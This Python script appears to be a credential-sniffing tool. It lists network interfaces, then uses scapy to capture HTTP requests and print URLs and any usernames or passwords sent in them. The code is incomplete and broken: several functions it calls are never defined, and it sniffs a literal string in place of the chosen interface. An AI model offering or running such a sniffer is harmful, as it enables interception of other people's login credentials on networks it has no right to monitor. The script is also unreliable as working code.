import time
from colorama import Fore, Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
from scapy.all import sniff

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        return re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output)).group(0)
    except:
        pass

def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        output1 = output.decode()
        ip = pattern.search(output1)[0]
        return ip
    except:
        pass


def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}interface_name', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)

def sniff(interface_name):
    scapy.all.sniff(iface='interface_name', store=False, prn=lambda packet: process_sniffed_packet(packet, choice))



def process_sniffed_packet(packet, choice):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        login_info = get_login_info(packet)
        if login_info:
            print(f"{Fore.GREEN}[+] Username OR password is Sent >>>> {login_info}{Style.RESET_ALL}")
        if choice.lower() == "y":
            raw_http_request(packet)

            
            
if __name__ == "__main__":
    interface_name = input("Enter the interface name (e.g., eth0, wlan0): ")
    print(f"Current MAC address: {get_current_mac(interface_name)}")
    print(f"Current IP address: {get_current_ip(interface_name)}")
    choice = input("Print raw packets? (Y/N): ")
    sniff(interface_name)
